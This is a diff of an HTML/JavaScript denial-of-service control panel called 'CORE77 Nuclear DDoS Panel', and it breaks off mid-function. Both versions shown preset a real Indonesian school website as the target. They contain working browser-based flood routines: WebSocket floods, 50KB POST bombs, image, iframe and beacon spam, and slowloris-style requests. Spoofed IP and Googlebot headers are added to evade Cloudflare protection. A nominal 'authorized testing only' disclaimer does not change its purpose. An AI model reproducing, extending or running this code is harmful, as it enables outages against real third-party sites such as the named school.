@@ -1,806 +1,451 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☢️ CORE77 - BRUTAL HTTP/2 DDoS PANEL</title>
+    <title>☢️ CORE77 - NUCLEAR DDoS PANEL (DIRECT IMPACT)</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'JetBrains Mono', 'Consolas', monospace;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            color: #f00; 
+            font-family: monospace; 
+            overflow: hidden; 
+            cursor: crosshair; 
         }
-
-        body {
-            background: #000;
-            color: #0f0;
-            overflow-x: hidden;
-            position: relative;
+        .blink { animation: blink 0.5s infinite; }
+        @keyframes blink { 50% { opacity: 0.3; } }
+        .container { padding: 10px; }
+        .nuke-btn { 
+            background: linear-gradient(45deg, #f00, #900);
+            color: #fff; 
+            border: none; 
+            padding: 20px; 
+            font-size: 2em; 
+            margin: 10px; 
+            cursor: pointer; 
+            width: 100%; 
+            text-transform: uppercase; 
+            letter-spacing: 5px; 
         }
-
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(255, 0, 100, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(0, 255, 200, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(100, 0, 255, 0.1) 0%, transparent 50%);
-            z-index: -1;
-            animation: pulse 10s infinite alternate;
+        .nuke-btn:hover { background: linear-gradient(45deg, #f44, #c00); }
+        .terminal { 
+            background: #111; 
+            height: 300px; 
+            overflow-y: auto; 
+            border: 2px solid #f00; 
+            padding: 10px; 
+            margin: 10px 0; 
         }
-
-        @keyframes pulse {
-            0% { opacity: 0.3; }
-            100% { opacity: 0.7; }
+        .stats { 
+            display: flex; 
+            justify-content: space-between; 
+            padding: 10px; 
+            background: #222; 
+            border: 1px solid #f00; 
+            margin: 5px 0; 
         }
-
-        .scanlines {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(
-                to bottom,
-                transparent 50%,
-                rgba(0, 255, 0, 0.03) 50%
-            );
-            background-size: 100% 4px;
-            pointer-events: none;
-            z-index: 9999;
+        input, select { 
+            background: #000; 
+            color: #0f0; 
+            border: 1px solid #f00; 
+            padding: 10px; 
+            margin: 5px; 
+            width: 100%; 
         }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 20px;
-            position: relative;
-        }
-
-        .glitch-title {
-            font-size: 3.5rem;
-            text-align: center;
-            color: #ff0033;
-            text-shadow: 
-                0 0 10px #ff0033,
-                0 0 20px #ff0033,
-                0 0 30px #ff0033;
-            margin: 30px 0;
-            position: relative;
-            animation: glitch 3s infinite;
-        }
-
-        @keyframes glitch {
-            0%, 100% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-        }
-
-        .status-bar {
-            background: rgba(0, 20, 0, 0.8);
-            border: 1px solid #0f0;
-            padding: 15px;
-            margin: 20px 0;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            border-radius: 5px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
-        }
-
-        .stat-item {
-            text-align: center;
-        }
-
-        .stat-value {
-            font-size: 2rem;
-            color: #ff0033;
-            font-weight: bold;
-            text-shadow: 0 0 10px #ff0033;
-        }
-
-        .stat-label {
-            font-size: 0.9rem;
-            color: #0f0;
-            opacity: 0.8;
-        }
-
-        .control-panel {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
-            margin: 30px 0;
-        }
-
-        .panel {
-            background: rgba(0, 10, 0, 0.9);
-            border: 1px solid #0f0;
-            border-radius: 8px;
-            padding: 25px;
-            backdrop-filter: blur(10px);
-        }
-
-        .panel-title {
-            color: #ff0033;
-            border-bottom: 1px solid #0f0;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-            font-size: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .panel-title::before {
-            content: '⟫';
-            color: #0f0;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            color: #0f0;
-            margin-bottom: 8px;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        input, select, textarea {
-            width: 100%;
-            padding: 12px;
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid #0f0;
-            border-radius: 4px;
-            color: #0f0;
-            font-size: 1rem;
-            transition: all 0.3s;
-        }
-
-        input:focus, select:focus, textarea:focus {
-            outline: none;
-            border-color: #ff0033;
-            box-shadow: 0 0 15px rgba(255, 0, 51, 0.5);
-        }
-
-        .btn {
-            background: linear-gradient(45deg, #ff0033, #cc0022);
-            color: white;
-            border: none;
-            padding: 18px 30px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 1.2rem;
-            font-weight: bold;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            width: 100%;
-            margin: 10px 0;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transition: 0.5s;
-        }
-
-        .btn:hover::before {
-            left: 100%;
-        }
-
-        .btn:hover {
-            background: linear-gradient(45deg, #ff3366, #ff0033);
-            box-shadow: 0 0 30px rgba(255, 0, 51, 0.7);
-            transform: translateY(-2px);
-        }
-
-        .btn:disabled {
-            background: #333;
-            cursor: not-allowed;
-            opacity: 0.5;
-        }
-
-        .btn-success {
-            background: linear-gradient(45deg, #00cc66, #00994d);
-        }
-
-        .btn-success:hover {
-            background: linear-gradient(45deg, #00ff88, #00cc66);
-        }
-
-        .method-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 10px;
-            margin: 15px 0;
-        }
-
-        .method-card {
-            background: rgba(0, 20, 0, 0.7);
-            border: 1px solid #0f0;
-            padding: 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-align: center;
-        }
-
-        .method-card:hover {
-            background: rgba(255, 0, 51, 0.2);
-            border-color: #ff0033;
-            transform: scale(1.05);
-        }
-
-        .method-card.active {
-            background: rgba(255, 0, 51, 0.4);
-            border-color: #ff0033;
-            box-shadow: 0 0 15px rgba(255, 0, 51, 0.5);
-        }
-
-        .terminal {
-            background: #000;
-            border: 1px solid #0f0;
-            border-radius: 4px;
-            padding: 20px;
-            height: 500px;
-            overflow-y: auto;
-            margin-top: 20px;
-            font-family: 'Courier New', monospace;
-        }
-
-        .terminal-line {
-            margin-bottom: 5px;
-            line-height: 1.4;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-
-        .terminal-line.success { color: #00ff00; }
-        .terminal-line.error { color: #ff3333; }
-        .terminal-line.warning { color: #ffff00; }
-        .terminal-line.info { color: #00aaff; }
-        .terminal-line.critical { color: #ff00ff; }
-
-        .timestamp {
-            color: #888;
-            font-size: 0.8rem;
-        }
-
-        .progress-container {
-            margin: 20px 0;
-        }
-
-        .progress-bar {
-            height: 10px;
-            background: #000;
-            border: 1px solid #0f0;
-            border-radius: 5px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #ff0033, #00ffcc);
-            width: 0%;
-            transition: width 0.3s;
-        }
-
-        .attack-wave {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 100px;
-            background: linear-gradient(to top, rgba(255, 0, 51, 0.3), transparent);
-            pointer-events: none;
-            opacity: 0;
-        }
-
-        .attack-wave.active {
-            animation: wave 0.5s infinite;
-        }
-
-        @keyframes wave {
-            0% { transform: translateY(0); opacity: 0.5; }
-            100% { transform: translateY(-100px); opacity: 0; }
-        }
-
-        footer {
-            text-align: center;
-            margin-top: 40px;
-            padding: 20px;
-            color: #666;
-            font-size: 0.8rem;
-            border-top: 1px solid #0f0;
-        }
-
-        .floating-stats {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(0, 10, 0, 0.9);
-            border: 1px solid #ff0033;
-            padding: 15px;
-            border-radius: 8px;
-            z-index: 1000;
-            min-width: 200px;
-            box-shadow: 0 0 20px rgba(255, 0, 51, 0.5);
+        .target-display { 
+            font-size: 1.5em; 
+            color: #0f0; 
+            text-align: center; 
+            padding: 10px; 
+            border: 2px dashed #f00; 
+            margin: 10px 0; 
         }
     </style>
 </head>
-<body>
-    <div class="scanlines"></div>
+<body onload="init()">
     <div class="container">
-        <h1 class="glitch-title">☢️ CORE77 - BRUTAL HTTP/2 DDoS PANEL</h1>
+        <h1 class="blink">☢️ CORE77 - NUCLEAR DDoS PANEL (DIRECT IMPACT)</h1>
+        <div class="target-display" id="targetDisplay">TARGET: https://www.smkn3tgt.sch.id</div>
         
-        <div class="status-bar">
-            <div class="stat-item">
-                <div class="stat-value" id="totalRequests">0</div>
-                <div class="stat-label">TOTAL REQUESTS</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-value" id="reqPerSec">0</div>
-                <div class="stat-label">REQ/SECOND</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-value" id="successRate">0%</div>
-                <div class="stat-label">SUCCESS RATE</div>
-            </div>
-            <div class="stat-item">
-                <div class="stat-value" id="attackTime">0s</div>
-                <div class="stat-label">ATTACK TIME</div>
-            </div>
+        <input type="text" id="targetUrl" value="https://www.smkn3tgt.sch.id" placeholder="ENTER TARGET URL">
+        
+        <div class="stats">
+            <div>REQUESTS: <span id="reqCount">0</span></div>
+            <div>RPS: <span id="rps">0</span></div>
+            <div>SUCCESS: <span id="success">0%</span></div>
+            <div>THREADS: <span id="threads">0</span></div>
         </div>
-
-        <div class="control-panel">
-            <div class="panel">
-                <div class="panel-title">TARGET CONFIGURATION</div>
-                
-                <div class="input-group">
-                    <label>🎯 PRIMARY TARGET URL</label>
-                    <input type="text" id="targetUrl" value="https://www.smkn3tgt.sch.id" placeholder="https://target.com">
-                </div>
-
-                <div class="input-group">
-                    <label>🎯 SECONDARY TARGETS (Optional)</label>
-                    <textarea id="secondaryTargets" rows="3" placeholder="https://target1.com&#10;https://target2.com&#10;https://target3.com"></textarea>
-                </div>
-
-                <div class="input-group">
-                    <label>⚡ ATTACK INTENSITY</label>
-                    <select id="intensity">
-                        <option value="insane">INSANE (1000+ RPS)</option>
-                        <option value="brutal">BRUTAL (5000+ RPS)</option>
-                        <option value="apocalyptic">APOCALYPTIC (10000+ RPS)</option>
-                    </select>
-                </div>
-
-                <div class="input-group">
-                    <label>⏱️ ATTACK DURATION</label>
-                    <input type="text" id="duration" value="UNLIMITED" placeholder="UNLIMITED or seconds">
-                </div>
-            </div>
-
-            <div class="panel">
-                <div class="panel-title">ADVANCED ATTACK METHODS</div>
-                
-                <div class="method-grid">
-                    <div class="method-card active" data-method="http2">HTTP/2 MULTIPLEX</div>
-                    <div class="method-card active" data-method="slowloris">SLOWLORIS PRO</div>
-                    <div class="method-card active" data-method="cache">CACHE BOMB</div>
-                    <div class="method-card" data-method="websocket">WEBSOCKET FLOOD</div>
-                    <div class="method-card" data-method="graphql">GRAPHQL BOMB</div>
-                    <div class="method-card active" data-method="header">HEADER SPOOF</div>
-                    <div class="method-card" data-method="json">JSON DEEP BOMB</div>
-                    <div class="method-card" data-method="xml">XML BOMB</div>
-                    <div class="method-card" data-method="recursive">RECURSIVE GET</div>
-                    <div class="method-card" data-method="param">PARAMETER FLOOD</div>
-                    <div class="method-card active" data-method="mixed">MIXED BRUTAL</div>
-                    <div class="method-card" data-method="tor">TOR ROTATION</div>
-                </div>
-
-                <div class="input-group">
-                    <label>🛡️ HEADER SPOOFING PROFILE</label>
-                    <select id="headerProfile">
-                        <option value="cloudflare">CLOUDFLARE BYPASS</option>
-                        <option value="googlebot">GOOGLEBOT SPOOF</option>
-                        <option value="mobile">MOBILE DEVICE ROTATE</option>
-                        <option value="tor">TOR EXIT NODES</option>
-                        <option value="random">RANDOM AGGRESSIVE</option>
-                    </select>
-                </div>
-
-                <button class="btn" id="startBtn" onclick="startBrutalAttack()">
-                    ☢️ LAUNCH BRUTAL ATTACK
-                </button>
-                <button class="btn btn-success" id="stopBtn" onclick="stopBrutalAttack()" disabled>
-                    🛑 NUCLEAR STOP
-                </button>
-            </div>
+        
+        <select id="attackType">
+            <option value="nuclear">☢️ NUCLEAR MODE (MAX DESTRUCTION)</option>
+            <option value="bypass">🛡️ CLOUDFLARE BYPASS</option>
+            <option value="slow">🐌 SLOWLORIS ULTRA</option>
+            <option value="amplify">📡 AMPLIFICATION ATTACK</option>
+        </select>
+        
+        <button class="nuke-btn" onclick="launchNuclear()" id="launchBtn">🚀 LAUNCH NUCLEAR ATTACK</button>
+        <button class="nuke-btn" onclick="stopNuclear()" id="stopBtn" disabled>🛑 EMERGENCY STOP</button>
+        
+        <div class="terminal" id="terminal">
+            [SYSTEM] READY FOR NUCLEAR ATTACK<br>
+            [WARNING] THIS WILL CAUSE DIRECT IMPACT<br>
+            [TARGET] SET: https://www.smkn3tgt.sch.id
         </div>
-
-        <div class="panel">
-            <div class="panel-title">TERMINAL OUTPUT - BRUTAL MODE</div>
-            <div class="terminal" id="terminal">
-                <div class="terminal-line info">[SYSTEM] CORE77 BRUTAL HTTP/2 PANEL LOADED</div>
-                <div class="terminal-line info">[WARNING] THIS TOOL FOR STRESS TESTING AUTHORIZED SYSTEMS ONLY</div>
-                <div class="terminal-line info">[READY] Configure target and launch attack</div>
-            </div>
-        </div>
-
-        <div class="progress-container">
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-        </div>
-
-        <div class="attack-wave" id="attackWave"></div>
-
-        <footer>
-            ⚠️ CORE77 BRUTAL EDITION - FOR EDUCATIONAL & AUTHORIZED PENETRATION TESTING ONLY ⚠️
-        </footer>
-    </div>
-
-    <div class="floating-stats" id="floatingStats">
-        <div style="color: #ff0033; font-weight: bold; margin-bottom: 10px;">LIVE STATS</div>
-        <div>Active Threads: <span id="liveThreads">0</span></div>
-        <div>Memory Usage: <span id="memoryUsage">0 MB</span></div>
-        <div>Bandwidth: <span id="bandwidth">0 MB/s</span></div>
     </div>
 
     <script>
-        // Brutal attack engine
+        // Brutal attack variables
         let attackActive = false;
-        let attackStartTime = 0;
-        let totalRequests = 0;
-        let successfulRequests = 0;
-        let requestHistory = [];
-        let attackIntervals = [];
-        let controllers = [];
-        let activeMethods = new Set(['http2', 'slowloris', 'cache', 'header', 'mixed']);
-
-        // DOM Elements
-        const terminal = document.getElementById('terminal');
-        const totalRequestsEl = document.getElementById('totalRequests');
-        const reqPerSecEl = document.getElementById('reqPerSec');
-        const successRateEl = document.getElementById('successRate');
-        const attackTimeEl = document.getElementById('attackTime');
-        const progressFill = document.getElementById('progressFill');
-        const attackWave = document.getElementById('attackWave');
-        const liveThreads = document.getElementById('liveThreads');
-        const memoryUsage = document.getElementById('memoryUsage');
-        const bandwidth = document.getElementById('bandwidth');
-
-        // Header spoofing profiles
-        const headerProfiles = {
-            cloudflare: {
-                'User-Agent': [
-                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
-                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-                    'Googlebot/2.1 (+http://www.google.com/bot.html)',
-                    'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)'
-                ],
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Cache-Control': 'no-cache',
-                'Pragma': 'no-cache',
-                'X-Forwarded-For': () => `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`,
-                'X-Real-IP': () => `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`,
-                'CF-Connecting-IP': () => `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`,
-                'Referer': () => `https://www.google.com/search?q=${randomString(10)}`,
-                'X-Requested-With': 'XMLHttpRequest'
+        let requestCount = 0;
+        let successCount = 0;
+        let attackThreads = [];
+        let rpsHistory = [];
+        let startTime = 0;
+        
+        // Direct impact methods (lebih brutal)
+        const nuclearMethods = {
+            // Method 1: WebSocket Flood (paling ganas)
+            wsFlood: function(url) {
+                try {
+                    const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
+                    const ws = new WebSocket(wsUrl + '/ws');
+                    ws.onopen = () => {
+                        // Kirim data terus menerus
+                        const interval = setInterval(() => {
+                            if (!attackActive) {
+                                clearInterval(interval);
+                                ws.close();
+                                return;
+                            }
+                            ws.send('x'.repeat(10000)); // 10KB per frame
+                            recordRequest(true);
+                        }, 100);
+                    };
+                    ws.onerror = () => recordRequest(false);
+                } catch(e) {}
             },
-            googlebot: {
-                'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
-                'From': 'googlebot(at)googlebot.com',
-                'X-Forwarded-For': '66.249.66.1'
-            },
-            mobile: {
-                'User-Agent': [
-                    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
-                    'Mozilla/5.0 (Android 11; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0',
-                    'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36'
-                ],
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'X-Wap-Profile': 'http://www.google.com/oha/rdf/ua-profile-kila.xml'
-            }
-        };
-
-        // Utility functions
-        function randomInt(min, max) {
-            return Math.floor(Math.random() * (max - min + 1)) + min;
-        }
-
-        function randomString(length) {
-            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return result;
-        }
-
-        function getRandomHeaders() {
-            const profile = document.getElementById('headerProfile').value;
-            const headers = {};
-            const profileData = headerProfiles[profile] || headerProfiles.cloudflare;
             
-            for (const [key, value] of Object.entries(profileData)) {
-                if (typeof value === 'function') {
-                    headers[key] = value();
-                } else if (Array.isArray(value)) {
-                    headers[key] = value[Math.floor(Math.random() * value.length)];
-                } else {
-                    headers[key] = value;
+            // Method 2: Fetch dengan payload besar
+            fetchBomb: async function(url) {
+                const controller = new AbortController();
+                try {
+                    await fetch(url + '?nuke=' + Date.now(), {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Forwarded-For': randomIP(),
+                            'User-Agent': randomUA()
+                        },
+                        body: JSON.stringify({data: 'x'.repeat(50000)}), // 50KB payload
+                        mode: 'no-cors',
+                        signal: controller.signal
+                    });
+                    recordRequest(true);
+                } catch(e) {
+                    recordRequest(false);
                 }
-            }
-            
-            return headers;
-        }
-
-        function logToTerminal(message, type = 'info') {
-            const timestamp = new Date().toLocaleTimeString();
-            const line = document.createElement('div');
-            line.className = `terminal-line ${type}`;
-            line.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
-            terminal.appendChild(line);
-            terminal.scrollTop = terminal.scrollHeight;
-        }
-
-        // Method card selection
-        document.querySelectorAll('.method-card').forEach(card => {
-            card.addEventListener('click', function() {
-                const method = this.dataset.method;
-                if (activeMethods.has(method)) {
-                    activeMethods.delete(method);
-                    this.classList.remove('active');
-                } else {
-                    activeMethods.add(method);
-                    this.classList.add('active');
-                }
-            });
-        });
-
-        // Brutal attack methods
-        const attackMethods = {
-            http2: async function(url) {
-                // HTTP/2 multiplex simulation
-                const headers = getRandomHeaders();
-                const promises = [];
-                
-                for (let i = 0; i < 10; i++) {
-                    promises.push(
-                        fetch(`${url}?cache_bust=${Date.now()}_${i}`, {
-                            headers: headers,
-                            mode: 'no-cors',
-                            cache: 'no-store'
-                        }).catch(() => {})
-                    );
-                }
-                
-                await Promise.all(promises);
-                recordRequest(true);
             },
-
-            slowloris: function(url) {
-                // Slowloris attack simulation
+            
+            // Method 3: Image flood dengan resolusi besar
+            imgBomb: function(url) {
+                for(let i = 0; i < 5; i++) {
+                    const img = new Image();
+                    img.src = url + '?img=' + Date.now() + '&size=5000x5000&quality=100&' + Math.random();
+                    img.onload = img.onerror = () => recordRequest(true);
+                }
+            },
+            
+            // Method 4: XMLHttpRequest dengan timeout panjang
+            xhrSlow: function(url) {
                 const xhr = new XMLHttpRequest();
-                xhr.open('GET', `${url}?slowloris=${Date.now()}`);
-                const headers = getRandomHeaders();
-                for (const [key, value] of Object.entries(headers)) {
-                    xhr.setRequestHeader(key, value);
+                xhr.open('GET', url + '?slow=' + Date.now());
+                xhr.timeout = 30000; // 30 second timeout
+                xhr.onload = xhr.onerror = xhr.ontimeout = () => recordRequest(true);
+                
+                // Tambah header banyak2
+                for(let i = 0; i < 20; i++) {
+                    xhr.setRequestHeader('X-Custom-' + i, 'x'.repeat(1000));
                 }
-                xhr.timeout = 30000;
                 xhr.send();
-                
-                // Keep sending partial headers
-                setTimeout(() => {
-                    if (attackActive && xhr.readyState < 4) {
-                        xhr.send('X-a: b\r\n');
-                    }
-                }, 5000);
-                
+            },
+            
+            // Method 5: Beacon API spam
+            beaconSpam: function(url) {
+                for(let i = 0; i < 10; i++) {
+                    navigator.sendBeacon(url + '?beacon=' + Date.now(), 'data=' + 'x'.repeat(10000));
+                }
                 recordRequest(true);
             },
-
-            cache: function(url) {
-                // Cache busting attack
-                const uniqueUrl = `${url}?${randomString(10)}=${randomString(20)}&_=${Date.now()}`;
-                fetch(uniqueUrl, {
-                    headers: getRandomHeaders(),
-                    mode: 'no-cors'
-                }).catch(() => {});
+            
+            // Method 6: Iframe bomb
+            iframeBomb: function(url) {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = url + '?iframe=' + Date.now();
+                document.body.appendChild(iframe);
+                setTimeout(() => document.body.removeChild(iframe), 10000);
                 recordRequest(true);
-            },
-
-            header: function(url) {
-                // Header spam attack
-                const headers = getRandomHeaders();
-                // Add more random headers
-                headers[`X-${randomString(5)}`] = randomString(10);
-                headers[`Custom-${randomString(4)}`] = randomString(15);
-                
-                fetch(url, {
-                    headers: headers,
-                    mode: 'no-cors'
-                }).catch(() => {});
-                recordRequest(true);
-            },
-
-            mixed: function(url) {
-                // Mixed brutal attack
-                attackMethods.http2(url);
-                attackMethods.cache(url);
-                attackMethods.header(url);
-                attackMethods.slowloris(url);
             }
         };
-
+        
+        // Helper functions
+        function randomIP() {
+            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        }
+        
+        function randomUA() {
+            const uas = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+                'Googlebot/2.1 (+http://www.google.com/bot.html)',
+                'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
+            ];
+            return uas[Math.floor(Math.random() * uas.length)];
+        }
+        
         function recordRequest(success) {
-            totalRequests++;
-            if (success) successfulRequests++;
+            requestCount++;
+            if(success) successCount++;
             
             const now = Date.now();
-            requestHistory = requestHistory.filter(time => now - time < 1000);
-            requestHistory.push(now);
+            rpsHistory = rpsHistory.filter(time => now - time < 1000);
+            rpsHistory.push(now);
             
-            updateStats();
+            updateDisplay();
         }
-
-        function updateStats() {
-            const currentTime = attackActive ? Math.floor((Date.now() - attackStartTime) / 1000) : 0;
-            const rps = requestHistory.length;
-            const successRate = totalRequests > 0 ? Math.round((successfulRequests / totalRequests) * 100) : 0;
-            
-            totalRequestsEl.textContent = totalRequests.toLocaleString();
-            reqPerSecEl.textContent = rps;
-            successRateEl.textContent = `${successRate}%`;
-            attackTimeEl.textContent = `${currentTime}s`;
-            
-            // Update progress bar (pulse effect during attack)
-            if (attackActive) {
-                progressFill.style.width = `${(currentTime % 100) + 20}%`;
-                attackWave.classList.add('active');
-            } else {
-                progressFill.style.width = '0%';
-                attackWave.classList.remove('active');
-            }
-            
-            // Update floating stats
-            liveThreads.textContent = attackIntervals.length * 10;
-            memoryUsage.textContent = Math.round((performance.memory?.usedJSHeapSize || 0) / 1048576);
-            bandwidth.textContent = (rps * 2 / 1024).toFixed(2);
+        
+        function updateDisplay() {
+            document.getElementById('reqCount').textContent = requestCount.toLocaleString();
+            document.getElementById('rps').textContent = rpsHistory.length;
+            document.getElementById('success').textContent = requestCount > 0 ? 
+                Math.round((successCount / requestCount) * 100) + '%' : '0%';
+            document.getElementById('threads').textContent = attackThreads.length;
         }
-
-        function startBrutalAttack() {
-            const url = document.getElementById('targetUrl').value.trim();
-            const intensity = document.getElementById('intensity').value;
-            const duration = document.getElementById('duration').value;
+        
+        function log(msg) {
+            const terminal = document.getElementById('terminal');
+            terminal.innerHTML += '<br>[' + new Date().toLocaleTimeString() + '] ' + msg;
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function launchNuclear() {
+            const url = document.getElementById('targetUrl').value;
+            const attackType = document.getElementById('attackType').value;
             
-            if (!url) {
-                alert('Enter target URL!');
+            if(!url) {
+                alert('ENTER TARGET URL FIRST!');
                 return;
             }
             
-            // Reset state
+            // Reset
             attackActive = true;
-            attackStartTime = Date.now();
-            totalRequests = 0;
-            successfulRequests = 0;
-            requestHistory = [];
-            attackIntervals = [];
-            controllers = [];
+            requestCount = 0;
+            successCount = 0;
+            attackThreads = [];
+            rpsHistory = [];
+            startTime = Date.now();
             
             // Update UI
-            document.getElementById('startBtn').disabled = true;
+            document.getElementById('launchBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
+            document.getElementById('targetDisplay').textContent = 'ATTACKING: ' + url;
+            document.getElementById('targetDisplay').style.color = '#f00';
             
-            logToTerminal('☢️ BRUTAL HTTP/2 ATTACK INITIATED', 'critical');
-            logToTerminal(`🎯 Primary Target: ${url}`, 'info');
-            logToTerminal(`⚡ Intensity: ${intensity.toUpperCase()}`, 'warning');
-            logToTerminal(`⏱️ Duration: ${duration}`, 'info');
-            logToTerminal(`🛡️ Methods: ${Array.from(activeMethods).join(', ')}`, 'info');
-            logToTerminal(`═`.repeat(60), 'info');
+            log('🚀 NUCLEAR ATTACK LAUNCHED!');
+            log('☢️ TARGET: ' + url);
+            log('💀 ATTACK TYPE: ' + attackType);
+            log('⚠️ MAXIMUM DESTRUCTION INITIATED');
             
-            // Calculate attack parameters based on intensity
-            const intensityMap = {
-                'insane': { threads: 50, interval: 10 },
-                'brutal': { threads: 100, interval: 5 },
-                'apocalyptic': { threads: 200, interval: 2 }
-            };
-            
-            const params = intensityMap[intensity] || intensityMap.insane;
-            
-            // Launch attack threads for each method
-            Array.from(activeMethods).forEach(method => {
-                for (let i = 0; i < params.threads; i++) {
-                    const intervalId = setInterval(() => {
-                        if (!attackActive) return;
-                        attackMethods[method](url);
-                    }, params.interval);
-                    
-                    attackIntervals.push(intervalId);
-                }
-                
-                logToTerminal(`[${method.toUpperCase()}] Launched ${params.threads} threads`, 'success');
-            });
-            
-            // Add secondary targets if provided
-            const secondaryTargets = document.getElementById('secondaryTargets').value
-                .split('\n')
-                .filter(t => t.trim());
-                
-            if (secondaryTargets.length > 0) {
-                logToTerminal(`🎯 Secondary Targets: ${secondaryTargets.length}`, 'info');
-                secondaryTargets.forEach(target => {
-                    for (let i = 0; i < 10; i++) {
-                        const intervalId = setInterval(() => {
-                            if (!attackActive) return;
-                            attackMethods.mixed(target.trim());
-                        }, 50);
-                        attackIntervals.push(intervalId);
-                    }
-                });
+            // Launch based on attack type
+            switch(attackType) {
+                case 'nuclear':
+                    launchFullNuclear(url);
+                    break;
+                case 'bypass':
+                    launchBypassAttack(url);
+                    break;
+                case 'slow':
+                    launchSlowlorisUltra(url);
+                    break;
+                case 'amplify':
+                    launchAmplification(url);
+                    break;
             }
             
-            // Stats update interval
-            const statsInterval = setInterval(updateStats, 1000);
-            attackIntervals.push(statsInterval);
-            
-            // Auto-stop if duration is set
-            if (duration !== 'UNLIMITED' && !isNaN(parseInt(duration))) {
-                setTimeout(() => {
-                    if (attackActive) {
-                        stopBrutalAttack();
-                        logToTerminal(`⏱️ Attack completed after ${duration} seconds`, 'success');
-                        logToTerminal(`📊 Final Stats: ${totalRequests} total requests`, 'info');
-                    }
-                }, parseInt(duration) * 1000);
-            }
-            
-            updateStats();
+            // Auto-update stats
+            const statsInterval = setInterval(updateDisplay, 1000);
+            attackThreads.push(statsInterval);
         }
-
-        function stopBrutalAttack() {
+        
+        function launchFullNuclear(url) {
+            log('💣 LAUNCHING FULL NUCLEAR STRIKE');
+            
+            // WebSocket Flood (100 threads)
+            for(let i = 0; i < 100; i++) {
+                const interval = setInterval(() => {
+                    if(!attackActive) {
+                        clearInterval(interval);
